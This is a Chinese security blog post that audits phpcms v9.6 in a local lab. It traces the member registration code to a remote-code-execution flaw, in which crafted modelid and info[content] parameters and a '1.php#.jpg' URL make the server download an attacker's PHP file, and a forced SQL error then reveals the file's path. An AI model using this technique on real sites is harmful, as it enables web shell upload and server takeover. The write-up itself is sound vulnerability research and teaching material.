#  代码审计 | phpcmsV9.6超详细RCE代审流程   
 实战安全研究   2024-09-16 09:01  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 -  郑居中 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
# 前言：  
  
在代码审计中，漏洞出现都与数据输入有关。要跟用户输入的数据走，从数据流到控制流，看数据是否绕过，到达控制流  
# 环境搭建  
  
我使用的小皮面板搭建的，直接新建网站,然后点击配置，将端口修改为8081（不被占用即可）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobA9sZDZ39EiaQBiaJ7MgtDUtWbLBDpYHBlO2CoUucDyhIf1wJVuAeYkJw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobJjHBpSia88UibtSgdpo9N9kibL8EdAVhXXDdaiadwnT8LOX3RuAzjVzia5A/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在将zip包解压到wwwroot目录下（源码在附件中）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobs29xNkemD26ulqJ5ACcEHf7ap5AG0zdCoiasM4kZib1eiaxY4qLGKUicGw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
访问安装页面，若不自动跳转，就自己拼接路径 http://192.168.111.12:8081/install/install.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobotnEHl8UiabM94G5rmJ90ibyKR1fPrrVTWpZcXfMor0KzOFN2qWrF9SA/640?wx_fmt=png&from=appmsg "")  
  
img  
  
一直点下一步，选择全新安装  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobBgEA9mh3djUNOFxRWZyC7tmWtMZvPHsKA3wMCia2vicWibzdj6pIiacoNg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
在账号设置中，自己填写记住即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobraCZLETrxmrz9pJXM3poceaylfDnzyqmeMYlKtwsEO8tNe2vDzS2LQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
然后就可以了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob5qiaWZOU13DhlAiaGCaQ18IYiaSN4ToUPJP0k7DBxXKaRmNVpycQwv1Ug/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobvI1RO6Psb9myFdlk1wsbpEq8AnNoh2uicevRB6NjucN9pavqcFFHyIA/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 数据库  
  
安装phpmyadmin来管理数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob8Nsgdj1DhZ2jSchlMmJibQE7wrHKRcLb1eFsWaYHPwib6glzLavyaZpg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
成功后，点击管理，root/root即可进入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob2cUGYzLhE3j7gNzoLyoGZot0NfUx1z5QbXt2FU4JkrXrOgkyvc5Yug/640?wx_fmt=png&from=appmsg "null")  
  
img  
# 代审：  
  
在注册页面输入数据，跟进数据包，看看数据流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob19FuZvK8nSyB9IKWib0ibk7VYDibL5icNILibqyYCo4mrYHvoBo1SHdcxicQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
这里我建议，拿burpsuite抓包，放包，方便后续的动态调试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobhB68hBXFA99J2Q5XnskIicNQ80EDzSNHMb5d5b8GkiakDYXWK4ETIPMA/640?wx_fmt=png&from=appmsg "null")  
  
img  
```
http://192.168.111.12:8081/index.php?m=member&c=index&a=register&siteid=1
```  
  
根据路由分析，了解到基本的业务逻辑，跟着url找到关键的register方法  
  
打个断点，监听，把抓到的数据包放行，phpstorm即可接收到数据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobYRFAtRcaibwmrHjX7EqJje8oMPFWfBD11Rgo4vteiaMeHibWvx3JlYo9A/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
就可以看到数据包的内容，跟进，看看数据包经过什么函数/方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobYWaEZM5IkyKvP2hyZYptMjib9USPgUf2G8vVDpdQZRtpbVWicoUmzBmA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
register方法走的过程中，他创建一个数组userinfo，里面包含用户的信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobqf4HslhOnCibzSbteic3qXiaIoLeI9PTZibmibMdzNz5G2EBdBDHdIH0koA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
看到包含了两个文件，并且实例化了member_input这个类，把user info中的modelid参数进行传参。  
```
if($member_setting['choosemodel']) {
                require_once CACHE_MODEL_PATH.'member_input.class.php';
                require_once CACHE_MODEL_PATH.'member_update.class.php';
                $member_input = new member_input($userinfo['modelid']);        
                $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
                $user_model_info = $member_input->get($_POST['info']);                                        
            }
```  
  
跟进meber_input这个类之后呢，直接执行析构函数，看一眼做了什么，大致意思是数据库操作，赋值缓存，加载附件类之类的。  
```
function __construct($modelid) {
        $this->db = pc_base::load_model('sitemodel_field_model');
        $this->db_pre = $this->db->db_tablepre;
        $this->modelid = $modelid;
        $this->fields = getcache('model_field_'.$modelid,'model');
        //初始化附件类
        pc_base::load_sys_class('attachment','',0);
        $this->siteid = param::get_cookie('siteid');
        $this->attachment = new attachment('content','0',$this->siteid);
    }
```  
  
执行完后，可以看到modelid是10（默认）、fields是birthday、table_name是v9_model_field，直接找到数据库中的v9_model_field，看看表里面的内容，确实都对应的上。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobjfUbYKqrzWxjod9PqIVqOGDL6xOwfDvsKx9licnBpQMJJjRvNIuwtww/640?wx_fmt=png&from=appmsg "null")  
  
img  
## 漏洞出现：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobJoEo59ibnAibsiagKMib7GvAjbstVy15BpJwo8WYdaLIdicGwPTkzm6kppQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobmEhRibnYvia410l7iag0k6JShbPfC38AL3tp69jrFIQ4u4iaoWuP1av77g/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
尝试将modelid改为11，fields数组的值都变成11对应的字段，先不管，步出看后面的数据流向。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobOmicO0M74icltvEZVO5ayEibCFk3yQTGSkVHKxwEsAnLqDibVVOkbPgH2A/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobztX8ZOTX4mCWbAAmKYyd8z2UEajJDBTJibEZib5L37Bhu5RLuj1BtpKA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
步出之后，执行下面的代码，POST传参info（只要是我们用户可控制的参数都要注意，所有的漏洞存因都是用户可控）将POST请求中的info进行new_html_special_chars函数处理，然后在调用member_input对象中的get方法，将info值当作参数进行传参，并赋值给$user_model_info.  
  
**这其中modelid和info[data]中的data值，是可控参数**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobxCib595x5oxzbZN435Yudic7DM7Y0MFcSpvTmiaFcG0ictqJAq1spxRH4Q/640?wx_fmt=png&from=appmsg "null")  
  
img  
```
$_POST['info'] = array_map('new_html_special_chars',$_POST['info']);$user_model_info = $member_input->get($_POST['info']);
```  
  
跟进，把info的value值，当作data传递，然后进行trim_script函数处理，跟进trim_script函数，一看是xss过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobq6zwAebWzqvoBKFME7BlDRYgXMld5jYtlJibT8jaBqx6as4HkS03JBA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobaCvGC3TRsyNswt4ur9IuOfMCk7CKfDtQeJ3q0k4bKfT9938kkoPHyg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
步出，继续往下走，可以清楚的看到modelid和info的值，是可控的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobqFHbUibsibia6honR30SfLGG1Oz6OpeROqPZR4AeJ2DzZWcG4kr8lrVmw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobhic1ajuNU0QcL0DFXXZUgAa0v9mec7LOVY4jfEicHCiaRzhVGjwC8YmwA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
get函数：首先判断data是否为数组，然后遍历data键值对，判断data数据中的islink是否为1，field是否在dedar_filed数组中，跳过该字段进入下一个循环，将field值进行safe_replace函数过滤，获取fields中的值，判断name的长度，  
```
if(is_array($data)) {
            foreach($data as $field=>$value) {
                if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
                $field = safe_replace($field);
                $name = $this->fields[$field]['name'];
                $minlength = $this->fields[$field]['minlength'];
                $maxlength = $this->fields[$field]['maxlength'];
                $pattern = $this->fields[$field]['pattern'];
                $errortips = $this->fields[$field]['errortips'];
                if(empty($errortips)) $errortips = "$name 不符合要求！";
                $length = empty($value) ? 0 : strlen($value);
                if($minlength && $length fields)) showmessage('模型中不存在'.$field.'字段');
                if($maxlength && $length > $maxlength && !$isimport) {
                    showmessage("$name 不得超过 $maxlength 个字符！");
                } else {
                    str_cut($value, $maxlength);
                }
                if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
                if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
                $func = $this->fields[$field]['formtype'];
                if(method_exists($this, $func)) $value = $this->$func($field, $value);
                $info[$field] = $value;
            }
        }
        return $info;
```  
  
在这里发现，将formtype当作要执行的函数，判断当前的对象是否存在func方法，（也就是formtype）。如果存在就调用该方法，并将field和value值当作参数传入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobCicsUeYhl6YsstbDvNrfTCxN46Y9iaggsP7OECGREM2az8oq9LOkBquA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
首先查看当前对象有哪些方法可利用加上get()，一共6中方法，get()、textarea()、editor()、box()、images()、datetime()。欧克，也就是说filetype值一定要为这6个函数，否者直接退出不执行，  
  
现在就是从这6个函数中，找到可以利用的点，  
```
function textarea($field, $value) {
        if(!$this->fields[$field]['enablehtml']) $value = strip_tags($value);
        return $value;
    }
    function editor($field, $value) {
        $setting = string2array($this->fields[$field]['setting']);
        $enablesaveimage = $setting['enablesaveimage'];
        $site_setting = string2array($this->site_config['setting']);
        $watermark_enable = intval($site_setting['watermark_enable']);
        $value = $this->attachment->download('content', $value,$watermark_enable);
        return $value;
    }
    function box($field, $value) {
        if($this->fields[$field]['boxtype'] == 'checkbox') {
            if(!is_array($value) || empty($value)) return false;
            array_shift($value);
            $value = ','.implode(',', $value).',';
            return $value;
        } elseif($this->fields[$field]['boxtype'] == 'multiple') {
            if(is_array($value) && count($value)>1) {
                $value = ','.implode(',', $value).',';
                return $value;
            }
        } else {
            return $value;
        }
    }
    function images($field, $value) {
        //取得图片列表
        $pictures = $_POST[$field.'_url'];
        //取得图片说明
        $pictures_alt = isset($_POST[$field.'_alt']) ? $_POST[$field.'_alt'] : array();
        $array = $temp = array();
        if(!empty($pictures)) {
            foreach($pictures as $key=>$pic) {
                $temp['url'] = $pic;
                $temp['alt'] = str_replace(array('"',"'"),'`',$pictures_alt[$key]);
                $array[$key] = $temp;
            }
        }
        $array = array2string($array);
        return $array;
    }
    function datetime($field, $value) {
        $setting = string2array($this->fields[$field]['setting']);
        if($setting['fieldtype']=='int') {
            $value = strtotime($value);
        }
        return $value;
    }
```  
## 思路：  
  
逆向查找，通过modelid，field两个值，定位到datetime，若modeild为11，field为vision，则会filetype就会等于box，最后就会执行box函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob5gQgFOKmlSh25zFDG76z5El9qudFl36loVCQKW3OoqslyZ53ia0aEyQ/640?wx_fmt=png&from=appmsg "null")  
  
而这两个都是我们可控的参数，这边我们测试一下，是否可以调用其他函数呢？  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobWAs3PconqLmb0oEialumXheWRyN2IicIPecPIoybVErkFr5bcFfXzicdQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobyb49rJIJibBqvQMksXDhzXWvQtiboS9UdR661axt8b6eSxzia8VeJoqdA/640?wx_fmt=png&from=appmsg "null")  
  
  
答案是可以的，那现在我们就需要去看editor是否存在利用点  
  
进来之后分析editor函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobo4ox3HRbicgW6XoUI0N5WMPZXMdfew7FPsgSLjmicia8FzAssHoyibb8yA/640?wx_fmt=png&from=appmsg "null")  
  
  
前面没有发现什么，重点再download函数中，跟进，这里将content,$value值传参进入  
  
首先一步一步判断，这里将新建一个当前时间的目录，并且对value值进行new_stripslashes函数过滤，就是去除反斜线，再进行正则比配  
  
从远程下载文件到本地，保存在当时的时间目录中，且必须是图片后缀  
```
(href|src)=([\"|']?)([^ \"'>]+\.(gif|jpg|jpeg|bmp|png))\2
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobknD89uIcjjjGyNe3pyFXDO6oHqIjtQKTuCUg72Uo8rzXzEHt6mbFUA/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobbBhcCNz8ADRlo862iaIbK5TYfiau7wmNH14VqOdAOoaDc0EOjhXMsUxA/640?wx_fmt=png&from=appmsg "null")  
  
  
传入，这么一个东西，跟进  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobuFbRV2SEHw3LicicxppGTR1NZTORDkSibF43H4Lyy2CuFcareNFdVjq9A/640?wx_fmt=png&from=appmsg "null")  
  
ok现在就可以清楚的看到断点已经下来了，并且过了正则  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob2uwb0hd1fKANOpibGZJeOzvnhL9zy51CKpXAhvFNfgKz2qY1k6r1h3w/640?wx_fmt=png&from=appmsg "null")  
  
继续往下走，获取文件的后缀，将文件名替换成时间+随机数+后缀，然后再与前面的也是时间目录拼接，最后得到  
```
/www/admin/phpcms.com_80/wwwroot/uploadfile/2024/0819/20240819024321324.jpg
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobg1c8U1PR99Fyok6IqUkjWj0Ko0oFY27bT2wicQJsoTtC5ZqickWIewgQ/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobUNBnuU17DxQzG5LbdgYMBYib14uzw3Ld42CufOOWlWeMtUT8xfYoX2Q/640?wx_fmt=png&from=appmsg "null")  
  
  
在下面继续跟进，$this->upload_func是copy函数，将file（自己上传的文件）复制到服务器中的newfile中，只要执行这一段，服务端（远程服务器）就会接收到请求信息，再次查看时，服务器已经存储该文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobzseDQ5PSI0btqcicxepZRibszr4RDhkhmltuTgBtpZIgCHjiagA1Pyp9Q/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKoblkL5FTAjamDSv3fsEVOut4Diacug9yBJR46mOBR6UrUh86fHQjlSibrQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobC6eHFY6yF202TxTWE4haUHljoPRxbFbHnP42RbUYCDCCjYVBAKRu0A/640?wx_fmt=png&from=appmsg "null")  
  
那这样是不是要想可以上传php恶意文件到服务器呢？  
  
那我们就要思考怎么绕过正则，理清思路：现在只要url绕过正则达到上传php文件，就可以了  
```
modelid=11&info[content]='url'(href|src)=([\"|']?)([^ \"'>]+\.(gif|jpg|jpeg|bmp|png))\2
```  
  
这个正则只验证了后缀，再前面的的fillurl函数中检测url中是否存在#，若存在就取#号前的部分  
```
http://xxx/1.php#.jpghttp://xxx/1.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob7ib9V6vWbVfrL712k1mtshEklg03PLhJah7S7kEkCgalbCk6P3EDeug/640?wx_fmt=png&from=appmsg "null")  
  
  
且在正则中绕过成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob2p92CatVXYA0iaIMUl1raeloBEaic9z6YriaibjgkrQfaF4OERUs1oUxHw/640?wx_fmt=png&from=appmsg "null")  
  
  
测试，确实可以访问获取1.php文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobk5dZb9xib4lLka2AG2N8PAZYZravKP1u4aGiapP6Yb2dwOnc4awu9o3Q/640?wx_fmt=png&from=appmsg "null")  
  
## 难点：  
  
**php文件可上传到服务器，但是不返回路径**  
  
在上传完文件后会将$user_model_info，插入到数据库中，就是我们info[content]  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobtqZhAicBxEvfgz3PiadnOJzaPn2rholjb8Z4yLhOj4opytX6GesrAMRA/640?wx_fmt=png&from=appmsg "null")  
  
跟进！！！  
  
将data，和table进行了传入，而此时数据库中的表变成了v9_member_detail，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKob4BVtwmVj75HrRDkicxt29qclcGXIY533yjoNHUE6bXvCBZhIPOqS2Vg/640?wx_fmt=png&from=appmsg "null")  
```
public function insert($data, $table, $return_insert_id = false, $replace = false) {
        if(!is_array( $data ) || $table == '' || count($data) == 0) {
            return false;
        }
        $fielddata = array_keys($data);
        $valuedata = array_values($data);
        array_walk($fielddata, array($this, 'add_special_char'));
        array_walk($valuedata, array($this, 'escape_string'));
        $field = implode (',', $fielddata);
        $value = implode (',', $valuedata);
        $cmd = $replace ? 'REPLACE INTO' : 'INSERT INTO';
        $sql = $cmd.' `'.$this->config['database'].'`.`'.$table.'`('.$field.') VALUES ('.$value.')';
        $return = $this->execute($sql);
        return $return_insert_id ? $this->insert_id() : $return;
    }
```  
  
然后sql语句是：  
```
INSERT INTO `phpcmsv9`.`v9_member_detail`(`content`,`userid`) VALUES ('href=http://192.168.111.12:8081/uploadfile/2024/0819/20240819093411467.php','6')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobARzvwII9onRYG6mkDZMTqce4seHwaa4m1JD2MyD2gNgXn4Ny2b9TDA/640?wx_fmt=png&from=appmsg "null")  
  
因为content这个字段，是更改过的，再v9_member_detail表中不存在这个字段，所以导致强行sql报错，直接就将文件路径报出来了  
  
解决成功：强制sql报错，爆出文件路径，访问即可成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobkibwadj36KBJ92PpK4DlkAjeYTE7jVybfRXJ8CdGd9Vv4acDGR6FgnQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrRWkUsXwDH51mJ7tv9gKobic1mulAuicY68AZXfzaRkt5S9LRe0zktVKVsODbKuCgxgjkibHRibjibEMQ/640?wx_fmt=png&from=appmsg "null")  
```
```  
  
